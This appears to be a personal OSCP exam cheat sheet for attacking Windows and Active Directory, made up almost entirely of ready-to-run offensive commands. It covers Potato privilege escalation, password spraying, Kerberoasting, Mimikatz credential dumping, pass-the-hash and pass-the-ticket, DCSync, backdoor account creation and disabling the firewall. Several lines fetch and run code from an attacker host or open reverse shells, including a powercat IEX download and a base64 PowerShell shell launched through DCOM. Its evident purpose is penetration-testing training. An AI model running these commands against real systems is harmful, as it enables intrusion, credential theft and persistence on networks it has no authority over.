Tags: [[OSCP]]

---
[HackTricks - AD Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
# Initial Access
- `whoami`, `whoami /all` 
- `whoami /priv`
	- SeImpersonatePrivilege
		- Run [SweetPotato](https://github.com/CCob/SweetPotato)
			- `./sweetpotato.exe -a "C:\Users\Public\revshell.exe"`
		- [FullPowers tool](https://github.com/itm4n/FullPowers)
		- [How to use potatoes](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) & - [Pre-compiled Potatoes](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/privileges-abuse/seimpersonate/potatoes (Pre-compiled))
		- [How to use Juicy/Rogue Potato & Printspoofer](https://juggernaut-sec.com/seimpersonateprivilege/)
		- [Printspoofer - GitHub](https://github.com/itm4n/PrintSpoofer) `.\PrintSpoofer64.exe -i -c powershell.exe` `whoami`
		- [Juicy Potato - Github](https://github.com/k4sth4/Juicy-Potato/tree/main) `.\juicypotato.exe -l  -p c:\Users\tony\revshell.exe -t * -c "{9E175B9C-F52A-11D8-B9A5-505054503030}"`
	- SEbackupPriv
		- https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/
		- https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
	- SeShutdownPrivilege
		- Can a startup process be modified? Then modify & reboot
		- Check service has `Auto`: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'httpd'}
		- Reboot: `shutdown /r /t 0`
	- [SeManageVolumePrivilege](https://github.com/xct/SeManageVolumeAbuse)
		- `wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe`
		- 
- `whoami /groups`,
	- `net localgroup` or `Get-LocalGroup` (Existing groups)
	- `Get-LocalGroupMember groupname` (Inspect)
- `systeminfo` (wiki build number)
	- Windows kernel exploits

More Initial Access
- Lockout policy: `net accounts`
- `net user` or `Get-LocalUser`
	- Look for *Remote Desktop Users* (use RDP) and *Remote Management Users* (use WinRM)
	- `net user jeffadmin /domain` (look for Domain Admins) (look for prefix/suffix accounts)
		- Login: `evil-winrm -i 192.168.xx.xxx -u user -p "password\$\!"` 
		- Escape special characters: `"password$!"` = `"password\$\!"`
- `net group /domain` (look for custom groups)
	- `net group "Sale Department" /domain`
- `winpeas`: `cp ~/Tools/Windows/winpeasx64.exe .` & `python3 -m http.server 80`
- `sc query | findstr /i servicetofind` & `sc qc servicename` 
	- Look for "Local System" and "*Log on as a batch job*" 
		- Schedule a task to execute a program
- `runas /user:backupadmin cmd` (Prompts for password)

- `ipconfig /all` 
	- Check `route print` & show active connections `netstat -ano`
- Applications: 
	- 32-bit: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` (Remove `select displayname` for full properties)
	- 64-bit: `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` (Remove `select displayname` for full properties)
- `get-process`
	- Running processes `Powershell: Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
		- Look for services NOT installed in `System32`
	- Check binary permissions; `Powershell: icacls "C:\xampp\apache\bin\httpd.exe"
		- Look for `BUILTIN\Users:(F)` (Full Access for standard users)
- `Get-ObjectAcl -Identity objectorusername` 
	- Find `ActiveDirectoryRights` & `SecurityIdentifier`
	- Find "GenericAll":`Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
	- Convert SID: `Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`
		- Alt: `"S-1-5-21-1987370270-658905905-1781884369-1104", S-1-5-21-1987370270-658905905-1781884369-503" | Convert-SidToName`
# File Transfers
Windows
- CMD: `certutil.exe -f -urlcache http://kaliIP/revshell.exe`
- Powershell: `iwr -uri http://192.168.xx.xxx/winPEASx64.exe -Outfile winPEAS.exe`
Kali
- `python3 -m http 80`
- Impacket - [Walkthrough]( https://www.youtube.com/watch?v=A5xZ05THaao) & 
	- `impacket-smbserver -smb2support stage .`
	- Share: `impacket-smbserver share ~/Tools/Share -smb2support -d` (add `-user username -password password`)
	- Windows Target, enter attacker IP: `\\192.168.xx.xxx\
- NetCat
	- `/usr/share/seclists/Web-Shells/FuzzDB/nc.exe`
	- Listener on target: `nc.exe -nvlp 4433 > unix-privesc-check`
	- On attacker, open nc to send: `nc -nv 192.168.target.machine 4433 < /usr/bin/unix-privesc-check`
# PrivEsc
[HackTricks Windows PrivEsc]( https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- Run [WinPeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240828-cfb5c8f6) (`~/Tools/Windows/winpeasx64.exe`)
	- Always check Watson responses (vulnerability list)
	- Look for unquoted service path --> rename revshell.exe and place in path, then run (is it scheduled? Start on reboot?)
- Check scheduled tasks: 
	- `schtasks /query /fo LIST /v /TN "Task name"`
		- Check "Run As User", "Task To Run" & "Repeat Every"
		- Start listener, then `echo revshell.exe >> scheduledtask.bat`
-  [Powersploit](https://github.com/PowerShellMafia/PowerSploit)
	- [PowerView.ps1](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview) (See Tools) - [Powerview README](https://powersploit.readthedocs.io/en/latest/Recon/)
		- `Import-module .\PowerView.ps1`
		- `Get-NetDomain`
		- `Get-NetUser` (lots of detail), `Get-NetUser "jeff"`
			- `Get-NetUser | select cn,pwdlastset,lastlogon`  
			- `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
		- `Get-NetGroup | select cn`
			- `Get-NetGroup "Sales Department" | select member`
		- `Get-NetComputer`, `Get-NetComputer "host03"`
			- `Get-NetComputer | select operatingsystem,dnshostname`  
		- `Find-DomainShare`
			- `Find-DomainShare -CheckShareAccess` (look for `SYSVOL` on DC)
			- DC: `ls \\dc1.corp.com\sysvol\corp.com\`
			- Host: `ls "\\HOST04.corp.com\Important Files\"`
			- `cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml` 
				- `gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"` 
	- PowerUp.ps1 (See Tools)
		- `/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1`
		- `powershell -ep bypass` & `. .\PowerUp.ps1`
		- Find vulnerable services: `Get-ModifiableServiceFile`
	- [Get-spn.ps1](https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1)
		- Look for service accounts with better privileges
```
Add-Type -AssemblyName System.IdentityModel  
  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'ServiceName/DC.domain.nameoffsec'
```
- Run `jaws-enum.ps1`
- `enum4linux -h`
	- Users: `enum4linux -U` or `enum4linux -u user -p password`
# Pivot 
- Look at user data & user history
	- `tree /f /a`
	- `dir /s/b *.log` or `dir /s/b *.txt`
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) [Quick Start](https://github.com/nicocha30/ligolo-ng/wiki/Quickstart)
	- [Youtube - Ligolo walkthrough](https://www.youtube.com/watch?v=qou7shRlX_s)
	- Download [Agent.zip](https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip) & [Proxy.zip](https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz)
	- Run	
		- Windows: Upload agent.exe
		- Kali
			- `sudo ip tuntap add user kali mode tun ligolo`
			- `sudo ip link set ligolo up`
			- `cd ~/Tools/ligolo_ng` `./proxy -selfcert` (Starts Ligolo)
		- Windows: `agent.exe kaliIP:11601 -retry -ignore-cert`
		- Kali
			- In Ligolo: `session` & `start`
			- Start: `sudo ip route add target.ip.x.x/24 dev ligolo`
# Password Spraying
[HackTricks - Password Spraying](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying)
- Spray Passwords through AD (on target): `.\Spray-Passwords.ps1 -Pass Password123! -Admin`
- Spray through SMB shares (from Kali): `crackmapexec smb 192.168.target.ip -u users.txt -p 'Password123!' -d corp.com --continue-on-success` (users.txt is list of known AD users)
	- Crackmap will denote users with local admin priv with "(Pwn3d!)"
- Spray through Kerberos TGT's (kerbrute)(on target): `.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\users.txt "Nexus123!"`
# Lateral Movement
- "Run as" domain user (CMD): `runas /user:domain\username cmd.exe`
	- `net user /domain`
- With NTLM Hash
	- From Kali: `/usr/bin/impacket-wmiexec -hashes :USERNTLMHASHF84D7A70E2EB3B9F05C425E username@192.168.xx.xxx`
	-  From Kali: `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx`
- With creds
	- `./PsExec64.exe -i  \\HOST04 -u domain\tgtuser -p Password123! cmd`
	- Kerberoasting: `impacket-getuserspns -request -dc-ip dc01 domain/username
		- Crack with `hashcat hashes /usr/share/wordlists/rockyou.txt`
	- ASRep-Roast: `impacket-GetNPUsers -request -dc-ip dc01 domain/username -outputfile user.asrep
		- AS-REP hashes can't be passed (must crack)
		- Crack with `hashcat user.asrep /usr/share/wordlist/rockyou.txt` (add `-r /usr/share/hashcat/rules/best64.rule` if have time)
		- On Windows: `.\Rubeus.exe asreproast`
		- Save hash as `hashes.asreproast` (add `$23` separator to hash before username)
		- Crack: `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
	- `impacket-psexe domain/username@ip.address`
	- `crackmapexec smb $IP -u users -p "PaSSw0rd" -d domain.name`
- SMB (445)
	- `enum4linux -A 192.168.x.x` (`-u user -p password`)
	- Password spraying `crackmapexec smb 10.0.0.1 -u users.txt -p passwords.txt --continue-on-success --shares`
	- `smbclient //dc01/share -U domain/username`
		- `get filename.zip` (crack zip password with `zip2john`)
	- `smbclient -L //192.168.x.x -U domain/username`
- RDP (3389)
	- `crackmapexec rdp -u users -p passwords --continue-on-success 192.168.x.x.`
- WinRM (5985,5986)
	- `crackmapexec winrm -u users -p passwords --continue-on-success 192.168.x.x.`
	- PassTheHash: `evil-winrm -i 192.168.x.x -u adminsitrator -H administratorhash`
	- Creds: `evil-winrm -i 192.168.x.x. -u adminname -p ADMINpassw0rd`
# If Local Admin...
- Create backdoor account
	- `user /add backdoor password1` 
	- `net localgroup administrators /add backdoor`	
- Disable firewall
	- `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f`
	- `netsh advfirewall set allprofiles state off`
- Run [Mimikatz](https://github.com/ParrotSec/mimikatz)
	- `privilege::debug`, `token:elevate`
	- Find NTLM hashes: `sekurlsa::logonpasswords` or `lsadump::sam`
		- `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt`
		- `hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
	- Dump tickets: `sekurlsa::tickets`
		- "Ticket Granting Service" has limited options
		- "Ticket Granting Ticket" can request a TGS for specific resources
- Other
	- From Kali:`impacket-secretsdump domain/username@192.168.x.x
	- From Kali: `impacket-getNPUsers domain/user -outfile asrep.txt`
# Random
- Move a file to the current directory: `mv ~/dir/filepath/file.txt .
- Comment out changes to code rather than deleting it
- Try a different type of python (eg. python2) if you get errors
- Run command then `| findstr /i username

***AD Flowchart*** https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg


## Kerberoasting
For attacking Service Principal Names (SPNs) running for users. 

NOTE: This only works for high-privilege service accounts with weak passwords. 
- Look for SPNs running in the context of user accounts
- Will **NOT** work on computer, managed service, group-managed service, or *krbtgt* accounts
- Windows - Rubeus `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
	- Then crack the hashes: `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
- Windows - `Invoke-Kerberoast.ps1` (serve with python3)
	- `iex(new-object net.webclient).downloadString('http://192.168.kali.ip:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat`
	- `hashcat -m 13100 --force -a 0 mssql.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
	- or `john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 MSSQL.hash`
	- With Creds: 
		- `wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1` & transfer to target
		- `import-module ./Invoke-RunasCs.ps1`
		- `Invoke-RunasCs -Username serviceuser -Password servicepassword -Command "whoami"
		- `Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.kali.ip/powercat.ps1');powercat -c 192.168.kali.ip -p 5555 -e cmd"`
- Kali - Impacket: `sudo impacket-GetUserSPNs -request -dc-ip 192.168.xx.xxx corp.com/jeff`
	- Save generated hash to a new file (eg. `hashes.kerberoast2`)
	Note: If Error `Clock Skew too great` is generated, run `ntpdate` or `rdate` to sync clock}
	- Crack hash with Hashcat: `sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
## Silver Tickets
To show Kerberos tickets (PowerShell): `klist`
Creation requires:
- SPN Password hash
	- Run Mimikatz as administrator: `privilege::debug` & `sekurlsa::logonpasswords`
	- Find NTLM hash for service you want (eg. NTLM for `iis_service`)
- Domain SID
	- Get user SID: `whoami /user` (make sure to remove final 4/5 numbers if necessary)
- Target SPN

Use `Kerberos::Golden` in Mimikatz
- Example of iis_service to access website  `kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`
- User can be ANY user on the domain

# BloodHound
 - https://github.com/BloodHoundAD
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound
- https://support.bloodhoundenterprise.io/hc/en-us/articles/17715215791899-Getting-started-with-BloodHound-Community-Edition
- SoapHound https://github.com/FalconForceTeam/SOAPHound
- Custom bloodhound querys
	- All active sessions: `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
	- Matches: `MATCH (m:Computer) RETURN m`

## Process - SharpHound/BloodHound
- Import to Powershell: `Import-module .\Sharphound.ps1`
- Start Sharphound: `Invoke-Bloodhound` (For Help: `Get-Help Invoke-Bloodhound`)
	- Start Collection: `Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\jeff\Desktop\ -OutputPrefix "domain audit"`
	- Copy Zip file to Kali
		- Impacket: `sudo impacket-smbserver share -smb2support /smbshare -user test -password 'test'`
		- Access Kali IP through Windows Explorer: `\\192.168.xx.xxx\`
- Start Bloodhound: 
	- Start neo4J: `sudo neo4j start`
	- Run `bloodhound
	- Browse to `http://localhost:7474` and login
	- Launch Bloodhound: `bloodhound` (`neo4j:':V&+w.,N.hBq#5`)
	- Upload .zip file from Sharphound Collection (drag and drop into Bloodhound)

## Passing NTLM Hashes with Mimikatz
- Run Mimkatz as above to retrieve NTLM hash via `lsadump::sam`
- Gain an interactive shell with `impacket-psexec` (hash format "LMHash:NTHash"): 

# DCSync
Requires credentials for member of _Domain Admins_, _Enterprise Admins_, or _Administrators_
- Mimikatz (On Windows)
	- `lsadump::dcsync /user:domain\targetuser` (eg. `lsadump::dcsync /user:corp\dave`)
	- Save as `hashes.dcsync` and crack with Hashcat: `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
- Impacket-secretsdump (On Kali)
	- `impacket-secretsdump -just-dc-user targetuser domain.com/adminsuer:"AdminUserPassword\!"@192.168.dc.ip` 
	  (eg. `impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BlahBlahBlah"@192.168.50.162`)

## Overpass The Hash
Run **any** process as another (admin) user in Windows to cache their creds
- Windows: Shift right-click notepad, "run as different user", enter target user's creds to cache
- Mimikatz: `privilege::debug` then `sekurlsa::logonpasswords` (Grab target user NTLM hash)
- Create new PowerShell session as user from cached creds: `sekurlsa::pth /user:tgtuser /domain:corp.com /ntlm:USERNTLMHASHF84D7A70E2EB3B9F05C425E /run:powershell`
- Generate a TGT by authenticating to a network share: `net use \\files04`
- Check generated ticket with: `klist`
- Then run PsExec to launch cmd on targethost (files04): `.\PsExec.exe \\files04 cmd`

## Pass The Ticket
- Export all TGT/TGS (Mimikatz): `privilege::debug` & `sekurlsa::tickets /export`
- Check the exported tickets (PowerShell): `dir *.kirbi`
- Pick a ticket and inject it (Mimikatz): `kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
- Check import (PowerShell): `klist`
- Move to shared folder (PowerShell): `ls \\web04\`
## DCOM
Distributed Component Object Model (reqs Local Admin)
- Create variable for MMC2.0 applicationWith Admin(PowerShell): `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.target.ip"))`
- Start nc listener: `nc -nlvp 443`
- Create a variable to pass an execute argument (use `encode.py` script): 
```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e BASE64ENCODEDREVERSESHELLJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

